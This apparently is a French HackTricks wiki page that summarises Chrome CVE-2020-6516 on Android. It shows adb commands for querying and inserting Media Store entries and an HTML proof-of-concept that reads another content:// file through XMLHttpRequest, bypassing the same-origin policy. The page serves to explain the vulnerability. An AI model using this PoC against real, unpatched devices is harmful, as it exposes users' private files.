{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**Ceci est un r√©sum√© du post [https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/)**

### Lister les fichiers dans le Media Store
Pour lister les fichiers g√©r√©s par le Media Store, la commande ci-dessous peut √™tre utilis√©e :
```bash
$ content query --uri content://media/external/file
```
Pour une sortie plus conviviale, affichant uniquement l'identifiant et le chemin de chaque fichier index√© :
```bash
$ content query --uri content://media/external/file --projection _id,_data
```
Les fournisseurs de contenu sont isol√©s dans leur propre espace de noms priv√©. L'acc√®s √† un fournisseur n√©cessite l'URI sp√©cifique `content://`. Les informations sur les chemins d'acc√®s √† un fournisseur peuvent √™tre obtenues √† partir des manifestes d'application ou du code source du framework Android.

### Acc√®s de Chrome aux fournisseurs de contenu
Chrome sur Android peut acc√©der aux fournisseurs de contenu via le sch√©ma `content://`, lui permettant d'acc√©der √† des ressources comme des photos ou des documents export√©s par des applications tierces. Pour illustrer cela, un fichier peut √™tre ins√©r√© dans le Media Store et ensuite accessible via Chrome :

Ins√©rer une entr√©e personnalis√©e dans le Media Store :
```bash
cd /sdcard
echo "Hello, world!" > test.txt
content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
```
D√©couvrez l'identifiant du fichier nouvellement ins√©r√© :
```bash
content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
# Output: Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```
Le fichier peut ensuite √™tre consult√© dans Chrome en utilisant une URL construite avec l'identifiant du fichier.

Par exemple, pour lister les fichiers li√©s √† une application sp√©cifique :
```bash
content query --uri content://media/external/file --projection _id,_data | grep -i <app_name>
```
### Chrome CVE-2020-6516: Contournement de la Politique de M√™me Origine

La _Politique de M√™me Origine_ (SOP) est un protocole de s√©curit√© dans les navigateurs qui restreint les pages web d'interagir avec des ressources provenant d'origines diff√©rentes, sauf si cela est explicitement autoris√© par une politique de Cross-Origin-Resource-Sharing (CORS). Cette politique vise √† pr√©venir les fuites d'informations et le vol de requ√™tes inter-sites. Chrome consid√®re `content://` comme un sch√©ma local, impliquant des r√®gles SOP plus strictes, o√π chaque URL de sch√©ma local est trait√©e comme une origine distincte.

Cependant, CVE-2020-6516 √©tait une vuln√©rabilit√© dans Chrome qui permettait de contourner les r√®gles SOP pour les ressources charg√©es via une URL `content://`. En effet, le code JavaScript d'une URL `content://` pouvait acc√©der √† d'autres ressources charg√©es via des URL `content://`, ce qui repr√©sentait une pr√©occupation majeure en mati√®re de s√©curit√©, en particulier sur les appareils Android ex√©cutant des versions ant√©rieures √† Android 10, o√π le stockage scop√© n'√©tait pas impl√©ment√©.

Le proof-of-concept ci-dessous d√©montre cette vuln√©rabilit√©, o√π un document HTML, apr√®s avoir √©t√© t√©l√©charg√© sous **/sdcard** et ajout√© au Media Store, utilise `XMLHttpRequest` dans son JavaScript pour acc√©der et afficher le contenu d'un autre fichier dans le Media Store, contournant les r√®gles SOP.

Proof-of-Concept HTML:
```xml
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team GCP (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
